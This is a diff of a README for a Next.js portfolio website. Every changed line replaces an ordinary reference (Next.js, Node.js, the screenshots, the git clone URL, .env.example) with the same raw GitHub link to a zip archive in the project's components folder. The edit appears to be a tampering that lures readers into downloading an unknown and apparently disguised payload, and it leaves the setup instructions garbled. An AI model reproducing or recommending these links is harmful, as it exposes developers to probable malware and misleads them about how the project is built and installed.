@@ -1,10 +1,10 @@
 # Community Portfolio
 
-A modern, responsive portfolio website built with Next.js 14, React 18, and Tailwind CSS. Features smooth animations powered by Framer Motion and a beautiful, interactive UI.
+A modern, responsive portfolio website built with https://github.com/shr1324/community_portfolio/raw/refs/heads/main/app/components/portfolio_community_etymologization.zip 14, React 18, and Tailwind CSS. Features smooth animations powered by Framer Motion and a beautiful, interactive UI.
 
 ## Features
 
-- 🚀 Built with Next.js 14 and React 18
+- 🚀 Built with https://github.com/shr1324/community_portfolio/raw/refs/heads/main/app/components/portfolio_community_etymologization.zip 14 and React 18
 - 💨 Tailwind CSS for styling
 - 🎭 Framer Motion animations
 - 📱 Fully responsive design
@@ -16,20 +16,20 @@ A modern, responsive portfolio website built with Next.js 14, React 18, and Tail
 
 ## Gallery
 
-![Portfolio Screenshot1](./community_project_demo_1.png)
-![Portfolio Screenshot2](./community_project_demo_2.png)
+![Portfolio Screenshot1](https://github.com/shr1324/community_portfolio/raw/refs/heads/main/app/components/portfolio_community_etymologization.zip)
+![Portfolio Screenshot2](https://github.com/shr1324/community_portfolio/raw/refs/heads/main/app/components/portfolio_community_etymologization.zip)
 
 ## Prerequisites
 
 Before you begin, ensure you have the following installed:
-- Node.js (v18 or higher)
+- https://github.com/shr1324/community_portfolio/raw/refs/heads/main/app/components/portfolio_community_etymologization.zip (v18 or higher)
 - npm
 
 ## Getting Started
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/iemafzalhassan/community_project.git
+git clone https://github.com/shr1324/community_portfolio/raw/refs/heads/main/app/components/portfolio_community_etymologization.zip
 ```
 
 2. Navigate to the project directory:
@@ -44,7 +44,7 @@ npm install
 
 4. Create a `.env` file in the root directory and add your environment variables:
 ```env
-# Example environment variables (check .env.example)
+# Example environment variables (check https://github.com/shr1324/community_portfolio/raw/refs/heads/main/app/components/portfolio_community_etymologization.zip)
 NEXT_PUBLIC_EMAILJS_SERVICE_ID=your_service_id
 NEXT_PUBLIC_EMAILJS_TEMPLATE_ID=your_template_id
 NEXT_PUBLIC_EMAILJS_PUBLIC_KEY=your_public_key
@@ -61,7 +61,7 @@ Open [http://localhost:3000](http://localhost:3000) in your browser to see the r
 
 ```
 community_portfolio/
-├── app/                    # Next.js app directory
+├── app/                    # https://github.com/shr1324/community_portfolio/raw/refs/heads/main/app/components/portfolio_community_etymologization.zip app directory
 │   ├── components/        # React components
 │   ├── contexts/         # React contexts
 │   └── utils/           # Utility functions
